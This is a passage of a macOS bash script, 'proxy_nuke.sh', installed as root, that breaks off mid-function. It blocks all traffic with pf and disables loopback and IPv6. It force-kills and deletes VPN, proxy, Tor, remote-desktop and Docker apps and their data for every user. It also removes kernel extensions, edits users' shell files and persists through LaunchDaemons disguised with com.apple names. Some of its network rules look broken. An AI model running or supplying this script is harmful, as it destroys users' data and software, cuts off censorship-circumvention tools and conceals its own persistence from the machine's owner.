sudo bash -c 'cat > /usr/local/bin/proxy_nuke.sh << '"'"'SCRIPT_EOF'"'"'
#!/bin/bash
VERSION="1.0.6"
SCRIPT_PATH="/usr/local/bin/proxy_nuke.sh"
SUPERVISOR_PATH="/usr/local/bin/proxy_nuke_supervisor.sh"
LAUNCHDAEMON_PLIST="/Library/LaunchDaemons/com.security.proxynuke.plist"
MARKER_FILE="/var/.proxy_nuke_installed"
CRON_MARKER="# proxy_nuke_supervisor"
SCRIPT_URL="https://raw.githubusercontent.com/hylclouds/blocklist/main/proxy_nuke.sh"
BLOCKLIST_URL="https://raw.githubusercontent.com/hylclouds/blocklist/a428e3205bf7a2ee0b873c701726834400be2441/jailbreak-block.txt"

run() { "$@" || true; }

update_hosts_file() {
    local blocklist
    blocklist=$(curl -fsSL "$BLOCKLIST_URL" 2>/dev/null) || true
    [ -z "$blocklist" ] && return
    local temp_hosts
    temp_hosts=$(mktemp /tmp/proxy_nuke_hosts.XXXXXX) || return
    echo "# proxy_nuke blocklist - $(date)" > "$temp_hosts"
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        [[ "$line" =~ ^# ]] && continue
        local domain
        domain=$(echo "$line" | awk '"'"'{print $1}'"'"' | sed '"'"'s/^0\.0\.0\.0//'"'"' | sed '"'"'s/^127\.0\.0\.1//'"'"' | tr -d '"'"'[:space:]'"'"')
        [ -z "$domain" ] && continue
        echo "0.0.0.0 $domain" >> "$temp_hosts"
    done <<< "$blocklist"
    [ -f /etc/hosts ] && cp /etc/hosts /etc/hosts.backup.proxy_nuke 2>/dev/null
    sed -i '"'"''"'" '/# proxy_nuke blocklist/d' /etc/hosts 2>/dev/null
    sed -i '"'"''"'" '/# Source: https:\/\/raw\.githubusercontent\.com\/hylclouds\/blocklist/d' /etc/hosts 2>/dev/null
    cat "$temp_hosts" >> /etc/hosts 2>/dev/null
    rm -f "$temp_hosts" 2>/dev/null
    run dscacheutil -flushcache 2>/dev/null
    run killall -HUP mDNSResponder 2>/dev/null
}

configure_pf_firewall() {
    cat > /etc/pf.anchors/proxy_nuke << '"'"'PFRULES'"'"'
block in all
block out all
block in quick from 172.20.10.0/28 to any
block in quick from any to 172.20.10.0/28
block out quick from 172.20.10.0/28 to any
block out quick from any to 172.20.10.0/28
block in quick from 192.168.2.0/24 to any
block in quick from any to 192.168.2.0/24
block out quick from 192.168.2.0/24 to any
block out quick from any to 192.168.2.0/24
block in quick from 192.168.4.0/24 to any
block in quick from any to 192.168.4.0/24
block out quick from 192.168.4.0/24 to any
block out quick from any to 192.168.4.0/24
block in quick from 192.168.137.0/24 to any
block in quick from any to 192.168.137.0/24
block out quick from 192.168.137.0/24 to any
block out quick from any to 192.168.137.0/24
block in quick from 192.168.64.0/20 to any
block in quick from any to 192.168.64.0/20
block out quick from 192.168.64.0/20 to any
block out quick from any to 192.168.64.0/20
block in quick from 169.254.0.0/16 to any
block in quick from any to 169.254.0.0/16
block out quick from 169.254.0.0/16 to any
block out quick from any to 169.254.0.0/16
pass out on lo0 proto tcp from any to any port 80 flags S/SA keep state
pass out on lo0 proto tcp from any to any port 443 flags S/SA keep state
pass out on lo0 proto udp from any to any port 53
pass out on lo0 proto udp from any to any port 67
pass out on lo0 proto udp from any to any port 68
pass out on lo0 proto icmp from any to any
pass out on dummy0 proto tcp from any to any port 80 flags S/SA keep state
pass out on dummy0 proto tcp from any to any port 443 flags S/SA keep state
pass out on dummy0 proto udp from any to any port 53
pass out on dummy0 proto udp from any to any port 67
pass out on dummy0 proto udp from any to any port 68
pass in on dummy0 proto tcp from any to any port 80
pass in on dummy0 proto tcp from any to any port 443
pass in on dummy0 proto udp from any to any port 53
PFRULES

    if [ -f /etc/pf.conf ]; then
        cp /etc/pf.conf /etc/pf.conf.backup.proxy_nuke 2>/dev/null || true
        sed -i '"'"''"'" '/proxy_nuke/d' /etc/pf.conf 2>/dev/null || true
        grep -q "anchor \"proxy_nuke\"" /etc/pf.conf 2>/dev/null || cat >> /etc/pf.conf << '"'"'PFCONF'"'"'
anchor "proxy_nuke"
load anchor "proxy_nuke" from "/etc/pf.anchors/proxy_nuke"
PFCONF
    else
        cat > /etc/pf.conf << '"'"'PFCONF'"'"'
anchor "proxy_nuke"
load anchor "proxy_nuke" from "/etc/pf.anchors/proxy_nuke"
PFCONF
    fi

    run pfctl -e 2>/dev/null
    run pfctl -f /etc/pf.conf 2>/dev/null
    run pfctl -a proxy_nuke -f /etc/pf.anchors/proxy_nuke 2>/dev/null

    cat > /Library/LaunchDaemons/com.apple.pf.persist.plist << '"'"'PFPERSIST'"'"'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.pf.persist</string>
    <key>ProgramArguments</key>
    <array>
        <string>/sbin/pfctl</string>
        <string>-e</string>
        <string>-f</string>
        <string>/etc/pf.conf</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>LaunchOnlyOnce</key>
    <true/>
</dict>
</plist>
PFPERSIST
    chmod 644 /Library/LaunchDaemons/com.apple.pf.persist.plist 2>/dev/null
    run launchctl unload /Library/LaunchDaemons/com.apple.pf.persist.plist 2>/dev/null
    run launchctl load /Library/LaunchDaemons/com.apple.pf.persist.plist 2>/dev/null
}

setup_dummy_interface() {
    run kextload /System/Library/Extensions/dummy.kext 2>/dev/null
    run ifconfig dummy0 create 2>/dev/null
    run ifconfig dummy0 192.168.255.255 netmask 255.255.255.255 up 2>/dev/null
    run dnctl pipe 1 config bw 100Kbit/s 2>/dev/null
    run dnctl pipe 2 config bw 100Kbit/s 2>/dev/null
    local interfaces
    interfaces=$(ifconfig -l 2>/dev/null) || true
    for iface in $interfaces; do
        echo "pass in on $iface proto tcp from any to any probability 1%" | run pfctl -a "drop_tcp_in_${iface}" -f - 2>/dev/null
        echo "pass in on $iface proto udp from any to any probability 1%" | run pfctl -a "drop_udp_in_${iface}" -f - 2>/dev/null
        echo "pass out on $iface proto tcp from any to any probability 1%" | run pfctl -a "drop_tcp_out_${iface}" -f - 2>/dev/null
        echo "pass out on $iface proto udp from any to any probability 1%" | run pfctl -a "drop_udp_out_${iface}" -f - 2>/dev/null
    done
    cat > /Library/LaunchDaemons/com.apple.dummy.persist.plist << '"'"'DUMMYPERSIST'"'"'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.dummy.persist</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>ifconfig dummy0 create 2>/dev/null; ifconfig dummy0 192.168.255.255 netmask 255.255.255.255 up 2>/dev/null; dnctl pipe 1 config bw 100Kbit/s 2>/dev/null; dnctl pipe 2 config bw 100Kbit/s 2>/dev/null</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>LaunchOnlyOnce</key>
    <true/>
</dict>
</plist>
DUMMYPERSIST
    chmod 644 /Library/LaunchDaemons/com.apple.dummy.persist.plist 2>/dev/null
    run launchctl unload /Library/LaunchDaemons/com.apple.dummy.persist.plist 2>/dev/null
    run launchctl load /Library/LaunchDaemons/com.apple.dummy.persist.plist 2>/dev/null
}

disable_loopback() {
    for i in $(seq 0 10); do
        run ifconfig "lo${i}" down 2>/dev/null
    done
    run ifconfig lo0 down 2>/dev/null
    run launchctl disable system/com.apple.networking.loopback 2>/dev/null
}

disable_ipv6_all_interfaces() {
    local interfaces
    interfaces=$(ifconfig -l 2>/dev/null) || true
    for iface in $interfaces; do
        run ifconfig "$iface" inet6 -ifdisabled 2>/dev/null
        run ifconfig "$iface" inet6 ::1 delete 2>/dev/null
    done
    run sysctl -w net.inet6.ip6.forwarding=0 2>/dev/null
    run sysctl -w net.inet6.ip6.accept_rtadv=0 2>/dev/null
    run sysctl -w net.inet6.ip6.auto_linklocal=0 2>/dev/null
    run sysctl -w net.inet6.ip6.enable=0 2>/dev/null
    local services
    services=$(networksetup -listallnetworkservices 2>/dev/null | tail -n +2) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        run networksetup -setv6off "$service" 2>/dev/null
        run networksetup -setv6LinkLocal "$service" 2>/dev/null
    done <<< "$services"
    run ifconfig lo0 inet6 ::1 delete 2>/dev/null
    run ifconfig lo0 inet6 fe80::1 delete 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.InternetSharing.plist 2>/dev/null
    run launchctl disable system/com.apple.InternetSharing 2>/dev/null
    run defaults delete com.apple.nat 2>/dev/null
    run rm -f /etc/nat.conf 2>/dev/null
}

disable_internet_sharing() {
    run launchctl unload /System/Library/LaunchDaemons/com.apple.InternetSharing.plist 2>/dev/null
    run launchctl disable system/com.apple.InternetSharing 2>/dev/null
    run defaults delete com.apple.nat 2>/dev/null
    run rm -f /etc/nat.conf 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.nat.plist 2>/dev/null
    run launchctl disable system/com.apple.nat 2>/dev/null
    local services
    services=$(networksetup -listallnetworkservices 2>/dev/null | grep -i "sharing\|nat\|bridge\|hotspot" 2>/dev/null) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        run networksetup -removenetworkservice "$service" 2>/dev/null
    done <<< "$services"
    for i in $(seq 0 10); do
        run ifconfig "bridge${i}" destroy 2>/dev/null
    done
    run kextunload -b "com.apple.driver.AppleUserNat" 2>/dev/null
}

remove_ipsec_connections() {
    local ipsec_services
    ipsec_services=$(networksetup -listallnetworkservices 2>/dev/null | grep -i "ipsec\|vpn\|l2tp\|pptp" 2>/dev/null) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        run networksetup -deletepppoeservice "$service" 2>/dev/null
        run networksetup -removenetworkservice "$service" 2>/dev/null
    done <<< "$ipsec_services"
    run launchctl unload /System/Library/LaunchDaemons/com.apple.racoon.plist 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.ppp.l2tp.plist 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.ppp.pptp.plist 2>/dev/null
    run launchctl disable system/com.apple.racoon 2>/dev/null
    run launchctl disable system/com.apple.ppp.l2tp 2>/dev/null
    run launchctl disable system/com.apple.ppp.pptp 2>/dev/null
    run pkill -f "racoon" 2>/dev/null
    run pkill -f "pppd" 2>/dev/null
    run pkill -f "vpnd" 2>/dev/null
    run pkill -f "ipsec" 2>/dev/null
    run rm -f /etc/racoon/psk.txt 2>/dev/null
    run rm -f /etc/racoon/racoon.conf 2>/dev/null
    run rm -rf /etc/racoon/certs 2>/dev/null
    run rm -f /etc/ppp/options 2>/dev/null
    run rm -f /etc/ppp/ppp.conf 2>/dev/null
    run defaults delete com.apple.ipsec 2>/dev/null
    run defaults delete com.apple.racoon 2>/dev/null
    for user_home in /Users/*; do
        run rm -f "${user_home}/Library/Preferences/com.apple.ipsec.plist" 2>/dev/null
        run rm -f "${user_home}/Library/Preferences/com.apple.racoon.plist" 2>/dev/null
    done
}

remove_thunderbolt_bridges() {
    run kextunload -b "com.apple.driver.AppleThunderboltIP" 2>/dev/null
    run kextunload -b "com.apple.driver.AppleThunderboltPCIUpAdapter" 2>/dev/null
    run kextunload -b "com.apple.driver.AppleThunderboltPCIDownAdapter" 2>/dev/null
    run kextunload -b "com.apple.driver.AppleThunderboltNHI" 2>/dev/null
    run kextunload -b "com.apple.driver.AppleThunderboltDPAdapter" 2>/dev/null
    run kextunload -b "com.apple.iokit.IOThunderboltFamily" 2>/dev/null
    run rm -rf "/Library/Extensions/AppleThunderboltIP.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/AppleThunderboltPCIUpAdapter.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/AppleThunderboltPCIDownAdapter.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/AppleThunderboltNHI.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/AppleThunderboltDPAdapter.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/IOThunderboltFamily.kext" 2>/dev/null
    local services
    services=$(networksetup -listallnetworkservices 2>/dev/null | grep -i "thunderbolt\|bridge" 2>/dev/null) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        run networksetup -removenetworkservice "$service" 2>/dev/null
    done <<< "$services"
    for i in $(seq 0 10); do
        run ifconfig "bridge${i}" destroy 2>/dev/null
        run ifconfig "thunderbolt${i}" destroy 2>/dev/null
    done
    run launchctl unload /System/Library/LaunchDaemons/com.apple.thunderbolt.plist 2>/dev/null
    run launchctl disable system/com.apple.thunderbolt 2>/dev/null
    run defaults delete com.apple.thunderbolt 2>/dev/null
    for user_home in /Users/*; do
        run rm -f "${user_home}/Library/Preferences/com.apple.thunderbolt.plist" 2>/dev/null
    done
}

remove_proxy_settings() {
    local services
    services=$(networksetup -listallnetworkservices 2>/dev/null | tail -n +2) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        run networksetup -setwebproxystate "$service" off 2>/dev/null
        run networksetup -setsecurewebproxystate "$service" off 2>/dev/null
        run networksetup -setftpproxystate "$service" off 2>/dev/null
        run networksetup -setsocksfirewallproxystate "$service" off 2>/dev/null
        run networksetup -setstreamingproxystate "$service" off 2>/dev/null
        run networksetup -setgopherproxystate "$service" off 2>/dev/null
        run networksetup -setproxyautodiscovery "$service" off 2>/dev/null
        run networksetup -setwebproxy "$service" "" 0 2>/dev/null
        run networksetup -setsecurewebproxy "$service" "" 0 2>/dev/null
        run networksetup -setftpproxy "$service" "" 0 2>/dev/null
        run networksetup -setsocksfirewallproxy "$service" "" 0 2>/dev/null
    done <<< "$services"
    local proxy_processes=("shadowsocks" "ss-local" "ss-server" "ss-manager" "v2ray" "xray" "trojan" "trojan-go" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "mitmdump" "mitmweb" "privoxy" "polipo" "tinyproxy" "squid" "tor" "i2psvc" "i2p" "psiphon" "lantern" "outline" "stunnel" "stunnel4" "obfs4proxy" "meek-client" "snowflake" "dnscrypt-proxy" "dns2socks" "dns2tcp" "proxychains" "proxychains4" "redsocks" "microsocks" "gost" "brook" "wstunnel" "v2ray-plugin" "xray-plugin" "clash-verge" "clash-for-windows")
    for proc in "${proxy_processes[@]}"; do
        run pkill -9 -f "$proc" 2>/dev/null
    done
    local proxy_launch_items=("shadowsocks" "v2ray" "xray" "trojan" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo" "mitmproxy" "privoxy" "tor" "i2p" "psiphon" "lantern" "outline" "stunnel" "dnscrypt" "gost" "brook" "wstunnel")
    for item in "${proxy_launch_items[@]}"; do
        for user_home in /Users/*; do
            for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
                run launchctl unload "${plist}" 2>/dev/null
                run rm -f "${plist}" 2>/dev/null
            done
        done
        for plist in "/Library/LaunchAgents/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
        for plist in "/Library/LaunchDaemons/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
    done
    for i in $(seq 0 20); do
        run ifconfig "utun${i}" destroy 2>/dev/null
        run ifconfig "tun${i}" destroy 2>/dev/null
        run ifconfig "tap${i}" destroy 2>/dev/null
    done
    local env_files=("/etc/profile" "/etc/bashrc" "/etc/zshrc" "/etc/zprofile" "/etc/environment")
    for env_file in "${env_files[@]}"; do
        if [ -f "$env_file" ]; then
            sed -i '"'"''"'" '/_proxy/d' "$env_file" 2>/dev/null
            sed -i '"'"''"'" '/PROXY/d' "$env_file" 2>/dev/null
        fi
    done
    for user_home in /Users/*; do
        local shell_configs=("${user_home}/.bashrc" "${user_home}/.bash_profile" "${user_home}/.zshrc" "${user_home}/.zprofile" "${user_home}/.zshenv" "${user_home}/.profile" "${user_home}/.config/fish/config.fish")
        for config in "${shell_configs[@]}"; do
            if [ -f "$config" ]; then
                sed -i '"'"''"'" '/_proxy/d' "$config" 2>/dev/null
                sed -i '"'"''"'" '/PROXY/d' "$config" 2>/dev/null
            fi
        done
    done
    run dscacheutil -flushcache 2>/dev/null
    run killall -HUP mDNSResponder 2>/dev/null
}

remove_vpn_and_ppp() {
    local all_services
    all_services=$(networksetup -listallnetworkservices 2>/dev/null | tail -n +2) || true
    while IFS= read -r service; do
        [ -z "$service" ] && continue
        case "$service" in
            *[Vv][Pp][Nn]*|[Ll]2[Tt][Pp]*|[Pp][Pp][Tt][Pp]*|[Ii][Pp][Ss][Ee][Cc]*|[Ww]ire[Gg]uard*|[Oo]pen[Vv][Pp][Nn]*|[Tt]unnel*[Bb]lick*|[Vv]iscosity*|[Ss]himo*|[Gg]lobal[Pp]rotect*|[Tt]ail[Ss]cale*|[Zz]ero[Tt]ier*|[Ss]oft[Ee]ther*|[Tt]inc*|[Ss]tunnel*|[Tt]or*|[Ii]2[Pp]*|[Pp]siphon*|[Ll]antern*|[Oo]utline*|[Ss]hadowsocks*|[Vv]2[Rr]ay*|[Xx]ray*|[Tt]rojan*|[Cc]lash*|[Ss]urge*|[Qq]uantumult*|[Ll]oon*|[Ss]hadow[Rr]ocket*|[Ss]tash*|[Hh]iddify*|[Nn]ekoray*|[Nn]eko[Bb]ox*|[Dd]ae*|[Mm]ihomo*)
                run networksetup -removenetworkservice "$service" 2>/dev/null
                ;;
        esac
    done <<< "$all_services"
    local vpn_apps=("OpenVPN" "WireGuard" "Cisco AnyConnect" "AnyConnect" "FortiClient" "NordVPN" "ExpressVPN" "Surfshark" "CyberGhost" "Private Internet Access" "PIA" "Mullvad" "ProtonVPN" "TunnelBear" "Windscribe" "VyprVPN" "PureVPN" "Viscosity" "Tunnelblick" "Shimo" "GlobalProtect" "Tailscale" "ZeroTier" "strongSwan" "SoftEther VPN" "Tinc" "OpenConnect" "stunnel" "Tor Browser" "I2P" "Psiphon" "Lantern" "Outline" "Shadowsocks" "V2Ray" "Xray" "Trojan" "Clash" "Surge" "Quantumult" "Loon" "Shadowrocket" "Stash" "Hiddify" "Nekoray" "NekoBox" "dae" "mihomo" "Clash Verge" "Clash for Windows")
    for app in "${vpn_apps[@]}"; do
        run rm -rf "/Applications/${app}.app" 2>/dev/null
        run rm -rf "/Applications/Utilities/${app}.app" 2>/dev/null
        for user_home in /Users/*; do
            run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
        done
    done
    local vpn_domains=("org.openvpn" "com.wireguard" "com.cisco.anyconnect" "com.fortinet.FortiClient" "com.nordvpn" "com.expressvpn" "com.surfshark" "com.cyberghost" "com.privateinternetaccess" "net.mullvad" "ch.protonvpn" "com.tunnelbear" "com.windscribe" "com.goldenfrog.VyprVPN" "com.purevpn" "com.sparklabs.Viscosity" "net.tunnelblick" "com.shimo" "com.paloaltonetworks.GlobalProtect" "io.tailscale" "com.zerotier" "org.strongswan" "org.softether" "org.tinc" "org.openconnect" "org.stunnel" "org.torproject" "net.i2p" "org.psiphon" "org.getlantern" "org.outline" "com.shadowsocks" "com.v2ray" "com.xray" "com.trojan" "com.clash" "com.surge" "com.quantumult" "com.loon" "com.shadowrocket" "com.stash" "com.hiddify" "com.nekoray" "com.nekobox" "com.dae" "com.mihomo")
    for domain in "${vpn_domains[@]}"; do
        run defaults delete "${domain}" 2>/dev/null
        for user_home in /Users/*; do
            run rm -f "${user_home}/Library/Preferences/${domain}.plist" 2>/dev/null
            run rm -rf "${user_home}/Library/Caches/${domain}" 2>/dev/null
            run rm -rf "${user_home}/Library/Application Support/${domain}" 2>/dev/null
        done
        run rm -rf "/Library/Caches/${domain}" 2>/dev/null
        run rm -rf "/Library/Application Support/${domain}" 2>/dev/null
    done
    for item in "${vpn_domains[@]}"; do
        for user_home in /Users/*; do
            for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
                run launchctl unload "${plist}" 2>/dev/null
                run rm -f "${plist}" 2>/dev/null
            done
        done
        for plist in "/Library/LaunchAgents/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
        for plist in "/Library/LaunchDaemons/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
    done
    local vpn_kexts=("net.tunnelblick.tun" "net.tunnelblick.tap" "com.wireguard" "com.cisco.anyconnect" "com.fortinet" "com.paloaltonetworks" "org.softether" "org.tinc" "org.openvpn")
    for kext in "${vpn_kexts[@]}"; do
        run kextunload -b "$kext" 2>/dev/null
    done
    run rm -rf "/Library/Extensions/tun.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/tap.kext" 2>/dev/null
    run rm -rf "/Library/Extensions/wireguard.kext" 2>/dev/null
    local vpn_processes=("openvpn" "wireguard" "wg-quick" "wg" "anyconnect" "vpnagentd" "acwebsecagent" "forticlient" "fortitray" "fortiwfw" "nordvpn" "expressvpn" "surfshark" "cyberghost" "pia" "mullvad" "protonvpn" "tunnelbear" "windscribe" "vyprvpn" "purevpn" "viscosity" "globalprotect" "tailscaled" "tailscale" "zerotier" "strongswan" "charon" "softether" "vpnclient" "vpnserver" "tincd" "openconnect" "stunnel" "tor" "i2p" "psiphon" "lantern" "outline" "shadowsocks" "v2ray" "xray" "trojan" "clash" "surge" "quantumult" "loon" "shadowrocket" "stash" "hiddify" "nekoray" "nekobox" "dae" "mihomo")
    for proc in "${vpn_processes[@]}"; do
        run pkill -9 -f "$proc" 2>/dev/null
    done
}

remove_screen_sharing() {
    run launchctl unload /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null
    run launchctl disable system/com.apple.screensharing 2>/dev/null
    run defaults write /var/db/launchdb/com.apple.launchd/overrides.plist com.apple.screensharing -dict Disabled -bool true 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.RemoteDesktop.agent.plist 2>/dev/null
    run launchctl disable system/com.apple.RemoteDesktop.agent 2>/dev/null
    run /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop 2>/dev/null
    run /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -configure -access -off 2>/dev/null
    run pkill -f "screensharing" 2>/dev/null
    run pkill -f "AppleVNCServer" 2>/dev/null
    run pkill -f "ARDAgent" 2>/dev/null
    run pkill -f "RemoteDesktop" 2>/dev/null
    local remote_apps=("TeamViewer" "TeamViewer_Host" "AnyDesk" "Chrome Remote Desktop" "Splashtop" "Splashtop Remote" "LogMeIn" "GoToMyPC" "ScreenConnect" "Bomgar" "RemotePC" "Zoho Assist" "Microsoft Remote Desktop" "Remote Desktop Manager" "mRemote" "Remmina" "RealVNC" "VNC Viewer" "TightVNC" "UltraVNC" "TigerVNC" "Chicken" "Duet Display" "Deskreen" "Parsec" "Moonlight" "Sunshine" "Luna Display" "Astropad" "Spacedesk" "AirServer" "Reflector" "AirParrot" "AirMedia" "Join.me")
    for app in "${remote_apps[@]}"; do
        run rm -rf "/Applications/${app}.app" 2>/dev/null
        run rm -rf "/Applications/Utilities/${app}.app" 2>/dev/null
        for user_home in /Users/*; do
            run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
        done
    done
    local remote_domains=("com.teamviewer.TeamViewer" "com.teamviewer.TeamViewerHost" "com.anydesk.AnyDesk" "com.google.ChromeRemoteDesktop" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect" "com.bomgar" "com.remotepc" "com.zoho.assist" "com.microsoft.rdc" "com.remotedesktopmanager" "org.remmina" "com.realvnc" "com.tightvnc" "com.ultravnc" "com.tigervnc" "com.duetdisplay" "com.deskreen" "com.parsec" "com.moonlight-stream" "com.lunadisplay" "com.astropad" "com.spacedesk" "com.airserver" "com.airsquirrels.Reflector" "com.airsquirrels.AirParrot" "com.join.me")
    for domain in "${remote_domains[@]}"; do
        run defaults delete "${domain}" 2>/dev/null
        for user_home in /Users/*; do
            run rm -f "${user_home}/Library/Preferences/${domain}.plist" 2>/dev/null
            run rm -rf "${user_home}/Library/Caches/${domain}" 2>/dev/null
            run rm -rf "${user_home}/Library/Application Support/${domain}" 2>/dev/null
        done
        run rm -rf "/Library/Caches/${domain}" 2>/dev/null
        run rm -rf "/Library/Application Support/${domain}" 2>/dev/null
    done
    local launch_items=("com.teamviewer" "com.anydesk" "com.splashtop" "com.logmein" "com.gotomypc" "com.screenconnect" "com.bomgar" "com.remotepc" "com.zoho" "com.parsec" "com.moonlight" "com.sunshine" "com.duetdisplay" "com.deskreen" "com.lunadisplay" "com.astropad" "com.spacedesk" "com.airserver" "com.airsquirrels" "com.join.me")
    for item in "${launch_items[@]}"; do
        for user_home in /Users/*; do
            for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
                run launchctl unload "${plist}" 2>/dev/null
                run rm -f "${plist}" 2>/dev/null
            done
        done
        for plist in "/Library/LaunchAgents/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
        for plist in "/Library/LaunchDaemons/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
    done
    for helper in /Library/PrivilegedHelperTools/*; do
        case "$(basename "$helper")" in
            *teamviewer*|*anydesk*|*splashtop*|*logmein*|*gotomypc*|*screenconnect*|*bomgar*|*remotepc*|*zoho*|*parsec*|*moonlight*|*sunshine*|*duet*|*deskreen*|*luna*|*astropad*|*spacedesk*|*airserver*|*reflector*|*airparrot*|*join*)
                run rm -rf "$helper" 2>/dev/null
                ;;
        esac
    done
}

remove_container_runtimes() {
    local container_apps=("Docker" "Podman" "Rancher Desktop" "Colima")
    for app in "${container_apps[@]}"; do
        run rm -rf "/Applications/${app}.app" 2>/dev/null
        for user_home in /Users/*; do
            run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
        done
    done
    local container_processes=("docker" "dockerd" "docker-compose" "docker-machine" "podman" "buildah" "skopeo" "runc" "containerd" "containerd-shim" "lima" "limactl" "colima" "rancher-desktop" "rdctl")
    for proc in "${container_processes[@]}"; do
        run pkill -9 -f "$proc" 2>/dev/null
    done
    local container_binaries=("/usr/local/bin/docker" "/usr/local/bin/docker-compose" "/usr/local/bin/docker-machine" "/usr/local/bin/podman" "/usr/local/bin/buildah" "/usr/local/bin/skopeo" "/usr/local/bin/runc" "/usr/local/bin/containerd" "/usr/local/bin/containerd-shim" "/usr/local/bin/lima" "/usr/local/bin/limactl" "/usr/local/bin/colima" "/usr/local/bin/nerdctl" "/usr/local/bin/ctr" "/usr/local/bin/crictl" "/usr/local/bin/kubectl")
    for binary in "${container_binaries[@]}"; do
        run rm -f "$binary" 2>/dev/null
    done
    local container_dirs=("/etc/docker" "/var/lib/docker" "/var/lib/containerd" "/var/lib/containers" "/var/lib/podman" "/var/lib/buildah" "/var/lib/rancher" "/var/lib/colima" "/var/lib/lima" "/opt/docker" "/opt/podman" "/opt/containerd" "/opt/rancher" "/opt/colima" "/opt/lima")
    for dir in "${container_dirs[@]}"; do
        run rm -rf "$dir" 2>/dev/null
    done
    for user_home in /Users/*; do
        run rm -rf "${user_home}/.docker" 2>/dev/null
        run rm -rf "${user_home}/.local/share/containers" 2>/dev/null
        run rm -rf "${user_home}/.config/docker" 2>/dev/null
        run rm -rf "${user_home}/.config/containers" 2>/dev/null
        run rm -rf "${user_home}/.config/podman" 2>/dev/null
        run rm -rf "${user_home}/.config/buildah" 2>/dev/null
        run rm -rf "${user_home}/.config/rancher" 2>/dev/null
        run rm -rf "${user_home}/.config/colima" 2>/dev/null
        run rm -rf "${user_home}/.config/lima" 2>/dev/null
        run rm -rf "${user_home}/.colima" 2>/dev/null
        run rm -rf "${user_home}/.lima" 2>/dev/null
    done
    local container_launch_items=("com.docker" "com.podman" "com.rancher" "com.colima" "com.lima")
    for item in "${container_launch_items[@]}"; do
        for user_home in /Users/*; do
            for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
                run launchctl unload "${plist}" 2>/dev/null
                run rm -f "${plist}" 2>/dev/null
            done
        done
        for plist in "/Library/LaunchAgents/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
        for plist in "/Library/LaunchDaemons/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
    done
    run kextunload -b "com.docker" 2>/dev/null
    run rm -rf "/Library/Extensions/docker.kext" 2>/dev/null
    for i in $(seq 0 20); do
        run ifconfig "docker${i}" destroy 2>/dev/null
        run ifconfig "br-${i}" destroy 2>/dev/null
        run ifconfig "veth${i}" destroy 2>/dev/null
    done
    if command -v brew &>/dev/null; then
        run brew uninstall --force docker docker-compose docker-machine podman buildah skopeo runc containerd lima colima nerdctl 2>/dev/null
        run brew cleanup 2>/dev/null
    fi
    if command -v port &>/dev/null; then
        run port uninstall docker docker-compose podman buildah skopeo runc containerd 2>/dev/null
    fi
}

remove_jailbreak_tools() {
    local jb_apps=("checkra1n" "unc0ver" "Taurine" "Odyssey" "Chimera" "Electra" "Fugu" "palera1n" "Dopamine" "xinaA15" "rootlessJB")
    for app in "${jb_apps[@]}"; do
        run rm -rf "/Applications/${app}.app" 2>/dev/null
        for user_home in /Users/*; do
            run rm -rf "${user_home}/Applications/${app}.app" 2>/dev/null
        done
    done
